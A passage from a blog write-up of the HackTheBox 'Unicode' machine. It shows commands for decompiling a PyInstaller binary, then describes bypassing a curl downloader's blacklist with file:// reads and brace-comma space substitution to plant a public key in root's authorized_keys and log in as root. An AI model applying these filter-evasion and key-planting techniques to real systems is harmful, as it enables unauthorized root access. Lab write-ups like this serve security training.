+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/LucifielHack/pyinstxtractor.git
+</span></span><span class="line"><span class="cl">git clone https://github.com/LucifielHack/pycdc.git
+</span></span><span class="line"><span class="cl">wget https://github.com/Kitware/CMake/releases/download/v3.23.1/cmake-3.23.1.tar.gz
+</span></span><span class="line"><span class="cl">tar xzvf cmake-3.23.1.tar.gz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> cmake-3.23.1
+</span></span><span class="line"><span class="cl">./bootstrap
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">sudo make install
+</span></span><span class="line"><span class="cl">cmake ../pycdc/CMakeLists.txt
+</span></span><span class="line"><span class="cl">make ../pycdc/
+</span></span><span class="line"><span class="cl">python3 pyinstxtractor.py &lt;binary&gt;
+</span></span><span class="line"><span class="cl">./pycdc /binary_extracted/binary.pyc</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507100601.png"
+        data-srcset="/assets/images/unicode/20220507100601.png, /assets/images/unicode/20220507100601.png 1.5x, /assets/images/unicode/20220507100601.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507100601.png"
+        title="error" /></p>
+<p>And it seems to have a blacklist , also it uses the curl command to download the files . and if we searched online how to read localfiles with curl will see using the <code>File://</code> wrapper as we did.</p>
+<h2 id="root-access">Root Access</h2>
+<p>now we want to login as root , i have downloaded the root id_rsa But unable to login with it. we can try uploading our public key at the <code>/root/.ssh/authorized_keys</code> , then try to connect with our private key.</p>
+<p>As we have option to download let&rsquo;s download our public key , But we can&rsquo;t specify where to save it:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507185729.png"
+        data-srcset="/assets/images/unicode/20220507185729.png, /assets/images/unicode/20220507185729.png 1.5x, /assets/images/unicode/20220507185729.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507185729.png"
+        title="error" /></p>
+<p>Seems the space is the problem , and hence the <strong>&rsquo;}&rsquo;</strong> and <strong>&rsquo;{&rsquo;</strong> are not filter we can make use of this technique:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507185909.png"
+        data-srcset="/assets/images/unicode/20220507185909.png, /assets/images/unicode/20220507185909.png 1.5x, /assets/images/unicode/20220507185909.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507185909.png"
+        title="error" /></p>
+<p>which the spaces are replaced with the <strong>&rsquo;,&rsquo;</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507191553.png"
+        data-srcset="/assets/images/unicode/20220507191553.png, /assets/images/unicode/20220507191553.png 1.5x, /assets/images/unicode/20220507191553.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507191553.png"
+        title="error" /></p>
+<p>then let&rsquo;s connect :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i unicode root@hackmedia.htb</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507191635.png"
+        data-srcset="/assets/images/unicode/20220507191635.png, /assets/images/unicode/20220507191635.png 1.5x, /assets/images/unicode/20220507191635.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507191635.png"
+        title="error" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-05-07</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-05-07-unicode/" data-title="Unicode Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,JWT,directory-traversal,decompile-binary"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-05-07-unicode/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-05-07-unicode/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-05-07-unicode%2f&amp;text=Unicode%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/jwt/">JWT</a>,&nbsp;<a href="/tags/directory-traversal/">Directory-Traversal</a>,&nbsp;<a href="/tags/decompile-binary/">Decompile-Binary</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/web-exploitation/2022-05-02-hacker-ts/" class="prev" rel="prev" title="Hacker Ts challenge writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hacker Ts challenge writeup</a>
+            <a href="/posts/web-exploitation/2022-05-19-kryptos-support/" class="next" rel="next" title="Kryptos Support challenge Writeup">Kryptos Support challenge Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
